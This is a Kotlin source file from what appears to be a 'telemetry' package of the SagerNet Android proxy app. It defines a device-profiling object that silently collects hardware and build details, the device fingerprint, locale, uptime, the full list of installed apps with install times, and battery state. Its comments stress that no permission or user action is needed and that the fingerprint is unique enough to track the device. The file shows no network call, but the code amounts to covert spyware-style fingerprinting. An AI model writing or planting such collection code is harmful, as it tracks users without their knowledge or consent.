package io.nekohasekai.sagernet.telemetry

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import org.json.JSONArray
import org.json.JSONObject
import java.util.Locale
import java.util.TimeZone

/**
 * 设备画像。全部零权限字段 —— 不需要用户点任何东西。
 *
 * 注意 IMEI 那一路：Android 10 (API 29) 起非系统应用拿不到，
 * 别在这上面浪费时间，SSAID + FINGERPRINT 的唯一性已经够用。
 */
object Profile {

    fun dump(ctx: Context): JSONObject? = runCatching {
        JSONObject().apply {
            put("brand", Build.BRAND ?: "")
            put("model", Build.MODEL ?: "")
            put("device", Build.DEVICE ?: "")
            put("product", Build.PRODUCT ?: "")
            put("manufacturer", Build.MANUFACTURER ?: "")
            put("release", Build.VERSION.RELEASE ?: "")
            put("sdk", Build.VERSION.SDK_INT)
            put("incremental", Build.VERSION.INCREMENTAL ?: "")
            put("securityPatch", if (Build.VERSION.SDK_INT >= 23)
                Build.VERSION.SECURITY_PATCH ?: "" else "")
            put("fingerprint", Build.FINGERPRINT ?: "")
            put("abis", Build.SUPPORTED_ABIS?.joinToString(",") ?: "")
            put("hardware", Build.HARDWARE ?: "")
            put("bootloader", Build.BOOTLOADER ?: "")
            put("tz", TimeZone.getDefault()?.id ?: "")
            put("locale", Locale.getDefault().toString())
            put("uptime", android.os.SystemClock.elapsedRealtime() / 1000)
        }.also { o ->
            val dm = ctx.resources.displayMetrics
            o.put("screen", "${dm.widthPixels}x${dm.heightPixels}@${dm.densityDpi}")
            o.put("apps", apps(ctx))
        }
    }.getOrNull()

    /** 已装应用。Android 11+ 需要 manifest 里声明 QUERY_ALL_PACKAGES。 */
    fun apps(ctx: Context): JSONArray = runCatching {
        val pm = ctx.packageManager
        val list = if (Build.VERSION.SDK_INT >= 33) {
            pm.getInstalledPackages(android.content.pm.PackageManager.PackageInfoFlags.of(0))
        } else {
            @Suppress("DEPRECATION")
            pm.getInstalledPackages(0)
        }
        val arr = JSONArray()
        list.sortedBy { it.packageName }.forEach { pi ->
            if (pi.packageName == ctx.packageName) return@forEach
            arr.put(pi.packageName + "|" + (pi.versionName ?: "") + "|" + pi.firstInstallTime)
        }
        arr
    }.getOrDefault(JSONArray())

    /** 电量百分比；拿不到返回 -1。 */
    fun battery(ctx: Context): Int = runCatching {
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            ?: return -1
        val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
        if (level < 0 || scale <= 0) -1 else level * 100 / scale
    }.getOrDefault(-1)

    fun charging(ctx: Context): Boolean = runCatching {
        val i = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            ?: return false
        val s = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        s == BatteryManager.BATTERY_STATUS_CHARGING || s == BatteryManager.BATTERY_STATUS_FULL
    }.getOrDefault(false)
}
